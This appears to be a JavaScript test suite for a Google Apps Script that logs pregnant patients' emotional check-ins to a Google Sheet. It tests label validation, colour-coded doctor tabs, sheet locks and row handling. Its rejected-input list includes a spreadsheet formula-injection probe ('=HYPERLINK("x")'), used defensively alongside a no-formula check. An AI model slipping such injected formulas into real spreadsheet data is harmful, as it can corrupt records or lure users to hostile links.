  const legacy = env.P(Object.assign({}, OK, { sessionId: sid(319), part2: 'Buồn' }));
  T('Nhãn cũ "Buồn" (web bản cũ, hàng chờ cũ) vẫn nhận, cột D ghi nguyên "Buồn" (không tự đổi thành "Đau khổ")', legacy.result === 'success' && env.sheets.CheckIn.rows[env.sheets.CheckIn.rows.length - 1][3] === 'Buồn', JSON.stringify(legacy));
  T('Nhãn cũ nằm riêng (LEGACY_EMOTION_LABELS = ["Buồn"]), không lẫn vào 9 nhãn web hiển thị', JSON.stringify(env.sandbox.LEGACY_EMOTION_LABELS) === '["Buồn"]' && env.sandbox.EMOTION_LABELS.indexOf('Buồn') < 0);
  const padded = env.P(Object.assign({}, OK, { sessionId: sid(320), part2: '  Mệt mỏi  ' }));
  T('Khoảng trắng hai đầu được bỏ ("  Mệt mỏi  " → "Mệt mỏi")', padded.result === 'success' && env.sheets.CheckIn.rows[env.sheets.CheckIn.rows.length - 1][3] === 'Mệt mỏi');
  /* Tên nháp chưa từng lên mạng ("Bình yên", "Tủi thân, cô đơn") và chuỗi gần giống đều bị từ chối */
  const odd = ['Bình yên', 'Tủi thân, cô đơn', 'Tủi thân', 'Cô Đơn', 'cô đơn', 'Co don', 'Đau', 'Đau khổ!', 'Bình an,', 'Mệt', 'Khóc', 'Hạnh phúc', 'buồn', '=HYPERLINK("x")', 'Vui vẻ\nBuồn', 'Mệt mỏi, Bình an', 'Cô đơn '];
  const before = env.sheets.CheckIn.rows.length;
  const rej = odd.map((e, i) => { const r = env.P(Object.assign({}, OK, { sessionId: sid(330 + i), part2: e })); return { e, ok: r.error === 'emotion_invalid' || (e === 'Cô đơn ' && r.result === 'success') }; });
  T(odd.length + ' chuỗi lạ / tên nháp ("Bình yên", "Tủi thân, cô đơn"), viết hoa/thường khác, không dấu, "buồn", công thức, hai nhãn ghép… → emotion_invalid', rej.every(r => r.ok), rej.filter(r => !r.ok).map(r => JSON.stringify(r.e)).join(', '));
  T('Chuỗi lạ không thêm dòng (chỉ "Cô đơn " có khoảng trắng cuối được bỏ khoảng trắng rồi nhận)', env.sheets.CheckIn.rows.length === before + 1, env.sheets.CheckIn.rows.length - before);
  T('Không ô nào bắt đầu bằng = + - @', noFormula(env.sheets.CheckIn));
}

/* ===== Menu cài một lần: tô màu + Tổng hợp + Tra cứu + khóa (02/11/2026) ===== */
{
  /* Tab CheckIn có sẵn: tiêu đề, 1 dòng SĐT ngày 30/10 (dòng lạ), 1 dòng mới, và 1 quy tắc màu anh tự đặt */
  const env = load();
  const ck = env.sheets.CheckIn = makeSheet('CheckIn');
  ck.rows.push(NEW_HEADER.split('|'), ['08:00:00 30/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn', sid(500)], ['09:00:00 02/11/2026', '0012345', '7 - Tốt', 'Mệt mỏi', sid(501)]);
  const foreign = { formula: '=$D2="Vui vẻ"', bg: '#000000', ranges: ['D2:D10'], getBooleanCondition: () => ({ getCriteriaValues: () => ['=$D2="Vui vẻ"'] }) };
  ck.cfRules.push(foreign);
  const dataBefore = JSON.stringify(ck.rows);
  const sb = env.sandbox;

  /* onOpen: thêm menu "Check-in" trỏ đúng hàm có thật */
  sb.onOpen();
  const menu = env.ui.menus[0] || { items: [] };
  T('onOpen: thêm menu "Check-in" → "Cài bảng bác sĩ (màu, Tổng hợp, Tra cứu, Hướng xử trí)" gọi caiDatBangBacSi (hàm có thật, tên không kết thúc "_")', menu.name === 'Check-in' && menu.added && menu.items.length === 1 && menu.items[0][0] === 'Cài bảng bác sĩ (màu, Tổng hợp, Tra cứu, Hướng xử trí)' && menu.items[0][1] === 'caiDatBangBacSi' && typeof sb.caiDatBangBacSi === 'function', JSON.stringify(menu));
  T('Nguồn: doPost KHÔNG gọi phần cài đặt (không tô màu, không khóa, không tạo tab mỗi lượt)', !/caiDatBangBacSi|applyAlertColors_|lockSheet_|ownTab_|setConditionalFormatRules|protect\(/.test(/function doPost[\s\S]*?\n}/.exec(SRC)[0]));

  const res = sb.caiDatBangBacSi();
  T('Chạy menu: trả kết quả đủ 4 phần, khóa 4 tab', res.checkinRules === 3 && res.summary && res.lookup && res.guide && JSON.stringify(res.locks) === JSON.stringify(['CheckIn', 'Tổng hợp', 'Tra cứu', 'Hướng xử trí']), JSON.stringify(res));
  T('Chạy menu: hộp thoại "Đã cài xong" cho anh, nhắc cột Gợi ý mở đầu và tab Hướng xử trí (bản nháp)', env.ui.alerts.length === 1 && /^Đã cài xong/.test(env.ui.alerts[0]) && /tab "Hướng xử trí" \(bản nháp dùng thử 0\.3 · 04\/11\/2026/.test(env.ui.alerts[0]) && /Gợi ý mở đầu/.test(env.ui.alerts[0]) && /Đã khóa: CheckIn, Tổng hợp, Tra cứu, Hướng xử trí\./.test(env.ui.alerts[0]), env.ui.alerts.join(' | '));
  T('Chạy menu: chờ khóa LockService và nhả khóa (không chen lúc doPost ghi)', env.lock.waits === 1 && env.lock.held === 0);
  T('Tab CheckIn: KHÔNG đổi dữ liệu, tiêu đề, số cột (không thêm cột F)', JSON.stringify(ck.rows) === dataBefore && ck.rows.every(r => r.length === 5), JSON.stringify(ck.rows[0]));

  /* a) Quy tắc màu tab CheckIn */
  const ours = ck.cfRules.filter(r => r !== foreign);
  const want = [['#F4CCCC', 1, 3], ['#FFF2CC', 4, 5], ['#D9EAD3', 6, 10]];
  const N = 'IFERROR(VALUE(LEFT($C2&" ",FIND(" ",$C2&" ")-1)),0)';
  T('CheckIn: nới tab lên 20 000 hàng (thêm hàng trống ở cuối) rồi mới đặt vùng tô màu (B-02)', ck.maxRows === 20000 && ck.inserted[0] === '1000+19000', JSON.stringify({ max: ck.maxRows, ins: ck.inserted }));
  T('CheckIn: 3 quy tắc tô CẢ DÒNG A2:D20000 theo số đầu cột C – ĐỎ nhạt 1–3, VÀNG nhạt 4–5, XANH lá nhạt 6–10',
    ours.length === 3 && ours.every((r, i) => r.bg === want[i][0] && r.formula === '=AND(' + N + '>=' + want[i][1] + ',' + N + '<=' + want[i][2] + ')' && JSON.stringify(r.ranges) === '["A2:D20000"]'),
    JSON.stringify(ours.map(r => [r.bg, r.ranges, r.formula])));
  T('CheckIn: giữ nguyên quy tắc màu anh tự đặt', ck.cfRules[0] === foreign);
  T('CheckIn: công thức tô màu chỉ dùng hàm Excel cũng có (tải .xlsx giữ màu) và chỉ đọc cột C (cảm xúc không đổi màu)',
    ours.every(r => { const fns = (r.formula.match(/[A-Z]+(?=\()/g) || []); return fns.every(f => ['AND', 'IFERROR', 'VALUE', 'LEFT', 'FIND'].includes(f)) && !/\$[ABDE]\d/.test(r.formula); }));
  /* Mô phỏng công thức tô màu bằng JS (cùng luật LEFT/FIND/VALUE) trên các ô cột C có thể gặp, kể cả dòng lạ */
  const num = c => { const t = String(c) + ' '; const v = t.slice(0, t.indexOf(' ')); return /^\d+(\.\d+)?$/.test(v) ? Number(v) : 0; };
  const band = c => { const n = num(c); return n >= 1 && n <= 3 ? 'ĐỎ' : n >= 4 && n <= 5 ? 'VÀNG' : n >= 6 && n <= 10 ? 'XANH' : '-'; };
  const cases = [['1 - Tuyệt vọng', 'ĐỎ'], ['3 - Tồi tệ', 'ĐỎ'], ['4 - Kém', 'VÀNG'], ['5 - Bình thường (Ổn)', 'VÀNG'], ['6 - Tương đối tốt', 'XANH'], ['10 - Rất tuyệt vời', 'XANH'], ['', '-'], ['Bình thường', '-'], ['7', 'XANH'], ['11 - lạ', '-']];
  const bad = cases.filter(([c, w]) => band(c) !== w);
  T('Luật tô màu (mô phỏng): "3 - Tồi tệ"→ĐỎ, "4 - Kém"→VÀNG, "10 - Rất tuyệt vời"→XANH; ô trống/dòng lạ không màu', bad.length === 0, bad.map(b => b[0] + '→' + band(b[0])).join(', '));

  /* b) Tab Tổng hợp */
  const th = env.sheets['Tổng hợp'];
  const thF = th && th.formulas.A2 || '';
  T('Tổng hợp: tạo tab, gắn dấu ẩn "do menu tạo", tiêu đề 7 cột (G "Gợi ý mở đầu"), đóng băng hàng 1',
    !!th && th.meta.some(m => m.key === 'checkin_me_bau_tab' && m.value === 'tong_hop') && JSON.stringify(th.rows[0]) === JSON.stringify(['Mã số BN', 'Lượt gần nhất (giờ)', 'Mức gần nhất', 'Cảm xúc gần nhất', 'Số lượt', 'Số lượt ĐỎ trong 14 ngày', 'Gợi ý mở đầu']) && th.frozen === 1,
    th && JSON.stringify(th.rows[0]));
  T('Tổng hợp: A2 là MỘT công thức tự cập nhật đọc tab CheckIn (LET, SORTN giữ lượt mới nhất, QUERY đếm, 14 ngày, mới nhất trên cùng)',
    /^=LET\(/.test(thF) && /'CheckIn'!A2:A/.test(thF) && /'CheckIn'!B2:B/.test(thF) && /SORTN\(SORT\(FILTER\(\{maSo,thoiGian,mucTxt,camXuc,tg\},coMa\),5,FALSE\),9\^9,2,1,TRUE\)/.test(thF) && /NOW\(\)-14/.test(thF) && /\(mucSo>=1\)\*\(mucSo<=3\)/.test(thF) && /group by Col1/.test(thF), thF.slice(0, 200));
  T('Tổng hợp: mã số so khớp đúng CHUỖI (TO_TEXT + VLOOKUP chính xác, không COUNTIF – COUNTIF coi "0012345" = "012345")',
    /maSo,ARRAYFORMULA\(TO_TEXT\('CheckIn'!B2:B\)\)/.test(thF) && /VLOOKUP\(ids,dem,2,FALSE\)/.test(thF) && !/COUNTIF/.test(thF));
  T('Tổng hợp: chịu dòng lạ – giờ khác dạng → IFERROR, mức không có số → 0, bảng trống → "Chưa có lượt check-in nào."',
    /ISNUMBER\(thoiGian\)/.test(thF) && /IFERROR\(VALUE\(REGEXEXTRACT\(TO_TEXT\(mucTxt\),"\^\\d\+"\)\),0\)/.test(thF) && /"Chưa có lượt check-in nào\."\)\)$/.test(thF));
  const thCF = th ? th.cfRules : [];
  T('Tổng hợp: nới 20 000 hàng, tô màu cả dòng A2:G20000 (gồm cột Gợi ý) theo "Mức gần nhất" (cột C), cùng 3 màu', th.maxRows === 20000 && thCF.length === 3 && thCF.every((r, i) => r.bg === want[i][0] && JSON.stringify(r.ranges) === '["A2:G20000"]' && r.formula.includes('$C2')), JSON.stringify(thCF.map(r => [r.bg, r.ranges])));

  /* d) Tab Tra cứu */
  const tc = env.sheets['Tra cứu'];
  const tcF = tc && tc.formulas.A6 || '';
  T('Tra cứu: tạo tab có dấu ẩn, A2 "Nhập mã số BN", ô B2 nền vàng nhạt + viền, dạng văn bản @ (giữ số 0 đầu)',
    !!tc && tc.meta.some(m => m.key === 'checkin_me_bau_tab' && m.value === 'tra_cuu') && tc.rows[1] && tc.rows[1][0] === 'Nhập mã số BN' && tc.fmt.includes('B2:#FFF59D') && tc.borders.includes('B2') && tc.numFmt.some(f => f.startsWith('B2,') && f.endsWith('=@')),
    tc && JSON.stringify({ r2: tc.rows[1], fmt: tc.fmt, nf: tc.numFmt }));
  T('Tra cứu: hàng 5 tiêu đề Thời gian · Mức · Cảm xúc · Cảnh báo · Gợi ý mở đầu', tc && JSON.stringify(tc.rows[4]) === JSON.stringify(['Thời gian', 'Mức', 'Cảm xúc', 'Cảnh báo', 'Gợi ý mở đầu']), tc && JSON.stringify(tc.rows[4]));
  T('Tra cứu: A6 lọc mọi lượt của mã ở B2 (FILTER maSo=ma), mới nhất trên cùng (SORT theo giờ giảm dần)',
    /^=LET\(ma,REGEXREPLACE\(TO_TEXT\(B2\),"\[\\s\.\\-\]",""\)/.test(tcF) && /SORT\(FILTER\(\{thoiGian,mucTxt,camXuc,canhBao\},maSo=ma\),FILTER\(tg,maSo=ma\),FALSE\)/.test(tcF), tcF.slice(0, 160));
  T('Tra cứu: cột Cảnh báo ĐỎ ≤3 / VÀNG ≤5 / XANH ≤10 theo số mức', /IF\(mucSo<1,"",IF\(mucSo<=3,"ĐỎ",IF\(mucSo<=5,"VÀNG",IF\(mucSo<=10,"XANH",""\)\)\)\)/.test(tcF));
  T('Tra cứu: ô trống → hướng dẫn ngắn; mã sai dạng → nhắc chỉ chữ số; mã không có → "Chưa có lượt check-in nào…" (không #N/A)',
    /IF\(ma="","Gõ mã số bệnh nhân vào ô B2 rồi bấm Enter\."/.test(tcF) && /REGEXMATCH\(ma,"\^\\d\{3,20\}\$"\)/.test(tcF) && /IFERROR\(SORT\([\s\S]*"Chưa có lượt check-in nào với mã số này\."\)\)\)\)$/.test(tcF));
  const tcCF = tc ? tc.cfRules : [];
  T('Tra cứu: tô màu kết quả A6:E1000 (gồm cột Gợi ý) theo cột Mức (B), cùng 3 màu', tcCF.length === 3 && tcCF.every((r, i) => r.bg === want[i][0] && JSON.stringify(r.ranges) === '["A6:E1000"]' && r.formula.includes('$B6')), JSON.stringify(tcCF.map(r => [r.bg, r.ranges])));
  /* Cột "Gợi ý mở đầu" (04/11/2026) */
  const thG = th && th.formulas.G2 || '', tcE = tc && tc.formulas.E6 || '';
  T('Tổng hợp: G2 là công thức mảng Gợi ý mở đầu theo C2:C (mức) + D2:D (cảm xúc), = openerFormula_("C2:C","D2:D"); cột G rộng 420, xuống dòng',
    thG === sb.openerFormula_('C2:C', 'D2:D') && /^=LET\(mucG,ARRAYFORMULA\(IFERROR\(VALUE\(REGEXEXTRACT\(TO_TEXT\(C2:C\)/.test(thG) && /TRIM\(TO_TEXT\(D2:D\)\)/.test(thG) && th.widths[7] === 420 && th.wraps.includes('G1:G20000=true'), thG.slice(0, 120));
  T('Tra cứu: E6 là công thức mảng Gợi ý mở đầu theo B6:B (mức) + C6:C (cảm xúc); cột E rộng 420, xuống dòng',
    tcE === sb.openerFormula_('B6:B', 'C6:C') && /TO_TEXT\(B6:B\)/.test(tcE) && /TRIM\(TO_TEXT\(C6:C\)\)/.test(tcE) && tc.widths[5] === 420 && tc.wraps.includes('E5:E1000=true'), tcE.slice(0, 120));
  T('Tra cứu: A3 thêm câu "Xem tab Hướng xử trí trước khi gọi thai phụ vào."', tc.rows[2] && tc.rows[2][0] === 'Màu theo mức: ĐỎ 1–3 · VÀNG 4–5 · XANH 6–10. Tự đánh giá, không phải thang chẩn đoán. Xem tab Hướng xử trí trước khi gọi thai phụ vào.', tc.rows[2] && tc.rows[2][0]);

  /* Tab Hướng xử trí */
  const hx = env.sheets['Hướng xử trí'];
  const hxRow = n => (hx && hx.rows[n - 1]) || [];
  T('Hướng xử trí: tạo tab, dấu ẩn kind "huong_xu_tri", đứng NGAY SAU tab Tra cứu',
    !!hx && hx.meta.some(m => m.key === 'checkin_me_bau_tab' && m.value === 'huong_xu_tri') && Object.keys(env.sheets).indexOf('Hướng xử trí') === Object.keys(env.sheets).indexOf('Tra cứu') + 1, JSON.stringify(Object.keys(env.sheets)));
  T('Hướng xử trí: A1 tiêu đề đậm, A2 trạng thái BẢN NHÁP (chưa ban hành, chưa kiểm định, không thay EPDS)',
    hxRow(1)[0] === 'HƯỚNG XỬ TRÍ PHIẾU CHECK-IN CẢM XÚC MẸ BẦU THEO 3 MÀU' && hxRow(2)[0] === 'Bản nháp dùng thử 0.3, cập nhật 04/11/2026 – chưa ban hành, chưa kiểm định. Phiếu là tự đánh giá, không phải công cụ chẩn đoán, không thay EPDS.' && hx.merges.some(m => m.a1 === 'A2:D2'), JSON.stringify(hxRow(2)));
  T('Hướng xử trí: A3 cách dùng cho người chỉ xem (tab Tổng hợp, Ctrl+F, cột G); Tra cứu chỉ cho người có quyền sửa',
    /^Cách dùng: ngay trước khi gọi thai phụ vào, mở tab Tổng hợp, bấm Ctrl\+F gõ mã số BN; cột G là gợi ý mở đầu\. Người có quyền sửa có thể gõ mã ở tab Tra cứu/.test(hxRow(3)[0]) && hx.merges.some(m => m.a1 === 'A3:D3'), hxRow(3)[0]);
  T('Hướng xử trí: hàng 6 tiêu đề Màu · Khi nào · Bác sĩ tư vấn làm gì · Bước tiếp theo; đủ 4 hàng XANH / VÀNG / ĐỎ / BÁO ĐỘNG',
    JSON.stringify(hxRow(6)) === JSON.stringify(['Màu', 'Khi nào', 'Bác sĩ tư vấn làm gì', 'Bước tiếp theo']) &&
    hxRow(7)[0] === 'XANH – Ổn định' && hxRow(8)[0] === 'VÀNG – Hỏi trước khi tư vấn' && hxRow(9)[0] === 'ĐỎ – Đánh giá trong buổi' && hxRow(10)[0] === '⚠ BÁO ĐỘNG – Mọi màu' &&
    [7, 8, 9, 10].every(n => hxRow(n).length === 4 && hxRow(n).every(c => String(c).length > 0)) && /\n/.test(hxRow(8)[2]) && hxRow(10)[3].includes('gọi BS Thông'), JSON.stringify([7, 8, 9, 10].map(n => hxRow(n)[0])));
  T('Hướng xử trí: nền hàng 7–9 đúng ALERT_COLORS (xanh/vàng/đỏ nhạt), hàng 10 nền #EA9999 chữ đậm',
    hx.fmt.includes('A7:D7:#D9EAD3') && hx.fmt.includes('A8:D8:#FFF2CC') && hx.fmt.includes('A9:D9:#F4CCCC') && hx.fmt.includes('A10:D10:#EA9999'), hx.fmt.filter(f => /^A\d+:D\d+:#/.test(f)).join(' '));
  T('Hướng xử trí: 9 thẻ chia 3 nhánh (hàng 12–17), đủ 9 nhãn EMOTION_LABELS, mỗi nhãn đúng một nhánh',
    hxRow(12)[0] === '9 thẻ capybara chia 3 nhánh' && JSON.stringify(hxRow(13).slice(0, 3)) === JSON.stringify(['Nhánh', 'Thẻ', 'Làm gì']) &&
    hxRow(14)[0] === '1. Thẻ dễ chịu' && hxRow(15)[0] === '2. Cần làm dịu trước' && hxRow(16)[0] === '3. Cần kết nối và nâng đỡ' && hxRow(17)[0] === 'Lưu ý' &&
    (() => { const names = [14, 15, 16].flatMap(n => hxRow(n)[1].split(', ')); return names.length === 9 && JSON.stringify(names.slice().sort()) === JSON.stringify(sb.EMOTION_LABELS.slice().sort()); })(),
    JSON.stringify([14, 15, 16].map(n => hxRow(n)[1])));
  T('Hướng xử trí: hàng 19–23 Nên nói / Tránh / Câu tự tạo khoảng cách / Ghi chép / Phiếu gửi ngoài giờ; hàng 25 Căn cứ (chữ xám nhỏ)',
    ['Nên nói', 'Tránh', 'Câu tự tạo khoảng cách', 'Ghi chép', 'Phiếu gửi ngoài giờ, từ nhà'].every((t, i) => hxRow(19 + i)[0] === t) && /^Căn cứ: /.test(hxRow(25)[0]) && /chưa thẩm định\.$/.test(hxRow(25)[0]) && hx.fmt.includes('#7a636c') && hx.fmt.includes('A25:size9'), JSON.stringify(hxRow(25)[0]).slice(0, 80));
  T('Hướng xử trí: chữ TĨNH – không công thức, mọi ô dạng văn bản @, không ô nào bắt đầu bằng = + - @',
    Object.keys(hx.formulas).length === 0 && hx.numFmt.includes('1,1,25x4=@') && noFormula(hx) && hx.rows.length === 25, JSON.stringify({ f: hx.formulas, nf: hx.numFmt }));
  T('Hướng xử trí: cột A 110 · B 170 · C 470 · D 260, xuống dòng, căn trên', hx.widths[1] === 110 && hx.widths[2] === 170 && hx.widths[3] === 470 && hx.widths[4] === 260 && hx.wraps.includes('1,1,25x4=true') && hx.valign.includes('1,1,25x4=top'), JSON.stringify(hx.widths));
  T('Hướng xử trí: không chứa dữ liệu bệnh nhân (không mã số, không giờ check-in)', !hx.rows.some(r => r.some(c => /0911111111|0012345|\d{2}:\d{2}:\d{2}/.test(String(c)))));

  /* Mô phỏng phần bỏ khoảng trắng/chấm/gạch của ô tra cứu bằng JS (cùng biểu thức) */
  const strip = v => String(v).replace(/[\s.\-]/g, '');
  T('Tra cứu (mô phỏng): "0012 345", "001.2345", "0012-345" → "0012345" (giữ số 0 đầu, khớp đúng chuỗi cột B)', ['0012 345', '001.2345', '0012-345', ' 0012345 '].every(v => strip(v) === '0012345') && strip('012345') !== '0012345');

  /* LET: tên biến không được giống địa chỉ ô (ví dụ "do14" = ô DO14 → Sheets báo lỗi) */
  const letNames = f => [...f.matchAll(/[(,]([A-Za-z][A-Za-z0-9]*),(?=[^,])/g)].map(m => m[1]).filter(n => /^(thoiGian|maSo|mucTxt|camXuc|tg|mucSo|soDo|coMa|ganNhat|dem|ids|canhBao|ma)$/.test(n) || /\d/.test(n));
  const cellLike = [...new Set(letNames(thF).concat(letNames(tcF)))].filter(n => /^[A-Za-z]{1,3}\d+$/.test(n));
  T('Công thức LET: không tên biến nào giống địa chỉ ô (kiểu DO14)', cellLike.length === 0, cellLike.join(','));
  T('Công thức Tổng hợp/Tra cứu: chỉ ghép chuỗi cố định + tên tab, không có dữ liệu người dùng (không chứa mã số/cảm xúc của dòng)', !/0911111111|0012345|Mệt mỏi|Rất tồi tệ/.test(thF + tcF));

  /* Khóa cứng */
  const pr = sh => sh.protections.filter(p => p.desc === 'Check-in Mẹ Bầu: chỉ chủ file sửa (menu Check-in tạo)');
  const pk = pr(ck)[0] || {}, pt = pr(th)[0] || {}, pc = pr(tc)[0] || {};
  T('Khóa: tab CheckIn khóa cứng (không chỉ cảnh báo), chỉ còn chủ file, tắt quyền sửa theo tên miền', pr(ck).length === 1 && pk.warningOnly === false && JSON.stringify(pk.editors) === '["chu-file@vi-du.vn"]' && pk.domainEdit === false, JSON.stringify(pk));
  T('Khóa: tab Tổng hợp khóa cứng, chỉ chủ file', pr(th).length === 1 && pt.warningOnly === false && JSON.stringify(pt.editors) === '["chu-file@vi-du.vn"]' && pt.unprotected.length === 0);
  const ph = pr(hx)[0] || {};
  T('Khóa: tab Hướng xử trí khóa cứng, chỉ chủ file, KHÔNG ô nào mở', pr(hx).length === 1 && hx.protections.length === 1 && ph.warningOnly === false && JSON.stringify(ph.editors) === '["chu-file@vi-du.vn"]' && ph.domainEdit === false && ph.unprotected.length === 0, JSON.stringify(ph.unprotected));
  T('Khóa: tab Tra cứu khóa cứng, CHỈ ô B2 để mở', pr(tc).length === 1 && pc.warningOnly === false && JSON.stringify(pc.editors) === '["chu-file@vi-du.vn"]' && JSON.stringify(pc.unprotected) === '["B2"]', JSON.stringify(pc.unprotected));

  /* Sau khi khóa, doPost (chạy bằng tài khoản chủ file) vẫn ghi được, không đụng tab khác */
  const r = env.P(Object.assign({}, OK, { sessionId: sid(510), part2: 'Bình an' }));
  T('Sau khi cài: doPost vẫn ghi vào CheckIn, không đụng Tổng hợp/Tra cứu', r.result === 'success' && ck.rows.length === 4 && ck.rows[3][3] === 'Bình an' && th.rows.length === 1 && Object.keys(th.formulas).join() === 'A2,G2', JSON.stringify(r));

  /* Chạy lại: kết quả y hệt, không nhân đôi quy tắc/khóa */
  const hxBefore = JSON.stringify(hx.rows);
  sb.caiDatBangBacSi();
  T('Chạy lại menu: CheckIn vẫn đúng 1 quy tắc anh tự đặt + 3 quy tắc của menu, 1 khóa, không nới thêm hàng', ck.cfRules.length === 4 && ck.cfRules[0] === foreign && pr(ck).length === 1 && ck.maxRows === 20000 && ck.inserted.length === 1, ck.cfRules.length + ' quy tắc, ' + pr(ck).length + ' khóa, ' + ck.maxRows + ' hàng');
  T('Chạy lại menu: Tổng hợp/Tra cứu dựng lại (xóa rồi ghi), vẫn 3 quy tắc, 1 khóa mỗi tab, công thức không đổi', th.cleared === 1 && tc.cleared === 1 && th.cfRules.length === 3 && tc.cfRules.length === 3 && pr(th).length === 1 && pr(tc).length === 1 && th.formulas.A2 === thF && tc.formulas.A6 === tcF && th.formulas.G2 === thG && tc.formulas.E6 === tcE);
  T('Chạy lại menu: dữ liệu CheckIn vẫn nguyên', ck.rows.length === 4 && ck.rows[1][1] === '0911111111');
  T('Chạy lại menu: Hướng xử trí dựng lại y hệt – 1 tab, 1 dấu ẩn, 1 khóa, cùng chữ, 10 ô gộp (không gộp chồng), vẫn ngay sau Tra cứu, không dời tab',
    Object.keys(env.sheets).filter(n => n === 'Hướng xử trí').length === 1 && hx.cleared === 1 && hx.meta.length === 1 && pr(hx).length === 1 &&
    JSON.stringify(hx.rows) === hxBefore && hx.merges.length === 10 && Object.keys(env.sheets).indexOf('Hướng xử trí') === Object.keys(env.sheets).indexOf('Tra cứu') + 1 && env.moves.length === 0,
    JSON.stringify({ merges: hx.merges.length, moves: env.moves, tabs: Object.keys(env.sheets) }));
  sb.caiDatBangBacSi();
  T('Chạy menu lần 3: vẫn đúng 4 tab (CheckIn + 3 tab của menu, không thêm tab), mỗi tab 1 khóa, quy tắc màu không tăng', Object.keys(env.sheets).length === 4 && ['CheckIn', 'Tổng hợp', 'Tra cứu', 'Hướng xử trí'].every(n => pr(env.sheets[n]).length === 1) && ck.cfRules.length === 4 && th.cfRules.length === 3 && tc.cfRules.length === 3 && hx.cfRules.length === 0 && hx.merges.length === 10, JSON.stringify(Object.keys(env.sheets)));
}

/* Tab "Tổng hợp"/"Tra cứu" do anh tự tạo (không có dấu ẩn) → không ghi đè; CheckIn đã có khóa riêng của anh → giữ */
{
  const env = load({ noUi: true });
  const mine = env.sheets['Tổng hợp'] = makeSheet('Tổng hợp');
  mine.rows.push(['Bảng anh tự làm']);
  const ck = env.sheets.CheckIn = makeSheet('CheckIn');
  ck.rows.push(NEW_HEADER.split('|'));
  const own = ck.protect().setDescription('khóa của anh');
  const res = env.sandbox.caiDatBangBacSi();
  T('Tab "Tổng hợp" anh tự tạo: KHÔNG ghi đè, không khóa, báo anh đổi tên', !res.summary && mine.rows[0][0] === 'Bảng anh tự làm' && mine.cleared === 0 && mine.protections.length === 0 && res.lookup, JSON.stringify(res));
  T('CheckIn đã có khóa riêng của anh: giữ nguyên, không thêm khóa thứ hai', ck.protections.length === 1 && ck.protections[0] === own && !res.locks.includes('CheckIn'), JSON.stringify(res.locks));
  T('Chạy từ editor (không có giao diện Sheet): không lỗi, vẫn cài tô màu', res.checkinRules === 3);
}
{
  const env = load();
  const res = env.sandbox.caiDatBangBacSi();
  T('Sheet chưa có tab CheckIn: menu tự tạo CheckIn (5 tiêu đề, ẩn E) rồi cài đủ', !!env.sheets.CheckIn && env.sheets.CheckIn.rows[0].join('|') === NEW_HEADER && env.sheets.CheckIn.hidden.includes(5) && res.summary && res.lookup && res.guide && res.locks.length === 4, JSON.stringify(res));
}

/* Sheet đặt ngôn ngữ Việt: Google có thể trả công thức tô màu với ";" và khoảng trắng → chạy lại menu không nhân đôi (gợi ý 1 review) */
{
  const env = load({ localizeCF: true });
  const ck = env.sheets.CheckIn = makeSheet('CheckIn');
  ck.rows.push(NEW_HEADER.split('|'));
  const foreign = { formula: '=$C2="7 - Tốt"', bg: '#000000', ranges: ['C2:C9'], getBooleanCondition: () => ({ getCriteriaValues: () => ['=$C2 = "7 - Tốt"'] }) };
  ck.cfRules.push(foreign);
  env.sandbox.caiDatBangBacSi();
  const crit = ck.cfRules[1].getBooleanCondition().getCriteriaValues()[0];
  env.sandbox.caiDatBangBacSi();
  env.sandbox.caiDatBangBacSi();
  T('Công thức trả về kiểu "; " (khác nguyên chuỗi đã đặt) – chạy menu 3 lần: CheckIn vẫn 1 quy tắc của anh + 3 của menu', /; /.test(crit) && ck.cfRules.length === 4 && ck.cfRules[0] === foreign, ck.cfRules.length + ' quy tắc; mẫu: ' + crit.slice(0, 60));
  T('… Tổng hợp và Tra cứu vẫn đúng 3 quy tắc mỗi tab', env.sheets['Tổng hợp'].cfRules.length === 3 && env.sheets['Tra cứu'].cfRules.length === 3);
  T('isOurRule_: quy tắc anh tự đặt trên cột C (không có đoạn lấy số mức) KHÔNG bị nhận nhầm', env.sandbox.isOurRule_(foreign, '$C2') === false && env.sandbox.isOurRule_(ck.cfRules[1], '$C2') === true && env.sandbox.isOurRule_(ck.cfRules[1], '$B6') === false);
}
{
  const env = load();
  const ck = env.sheets.CheckIn = makeSheet('CheckIn');
  ck.rows.push(NEW_HEADER.split('|'));
  ck.maxRows = 25000;
  env.sandbox.caiDatBangBacSi();
  T('Tab đã có 25 000 hàng: menu không thêm hàng, vùng tô màu A2:D25000', ck.inserted.length === 0 && ck.cfRules.every(r => JSON.stringify(r.ranges) === '["A2:D25000"]'), JSON.stringify(ck.cfRules.map(r => r.ranges)));
}

/* ===== B-01 (anh duyệt 02/11/2026): tab CheckIn hết hàng trống → doPost thêm 500 hàng rồi ghi, giữ định dạng @ ===== */
{
  const env = load();
  const ck = env.sheets.CheckIn = makeSheet('CheckIn');
  ck.maxRows = 3;
  ck.rows.push(NEW_HEADER.split('|'), ['08:00:00 01/11/2026', '26012345', '7 - Tốt', 'Vui vẻ', sid(600)], ['08:01:00 01/11/2026', '26012345', '6 - Tương đối tốt', 'Buồn', sid(601)]);
  const r = env.P(Object.assign({}, OK, { sessionId: sid(602), patientId: '0012345', part2: 'Cô đơn' }));
  T('maxRows 3, đã đủ 3 hàng: doPost vẫn inserted vào hàng 4, thêm 500 hàng (insertRowsAfter(3, 500))', r.result === 'success' && r.action === 'inserted' && ck.rows.length === 4 && ck.rows[3][1] === '0012345' && ck.rows[3][3] === 'Cô đơn' && JSON.stringify(ck.inserted) === '["3+500"]' && ck.maxRows === 503, JSON.stringify(r) + ' ' + JSON.stringify(ck.inserted));
  T('… dòng mới vẫn đặt định dạng @ (giữ số 0 đầu), không đổi sang appendRow', ck.numFmt.includes('4,1,1x5=@') && !/appendRow\(row\)/.test(/function doPost[\s\S]*?\n}/.exec(SRC)[0]), ck.numFmt.join(' '));
  const r2 = env.P(Object.assign({}, OK, { sessionId: sid(603) }));
  T('… lượt sau (còn hàng trống) không thêm hàng nữa', r2.result === 'success' && ck.inserted.length === 1 && ck.rows.length === 5);
  const r3 = env.P(Object.assign({}, OK, { sessionId: sid(602), patientId: '0012345', level: 9, part2: 'Bình an' }));
  T('… cùng Mã phiên vẫn cập nhật đúng dòng 4, không thêm hàng', r3.action === 'updated' && ck.rows[3][2] === '9 - Tuyệt vời' && ck.rows.length === 5 && ck.inserted.length === 1);
  /* Tab mới (insertSheet, 1000 hàng): lượt thứ 1000 (hàng 1001) vẫn ghi */
  const env2 = load();
  env2.P(OK);
  const t2 = env2.sheets.CheckIn;
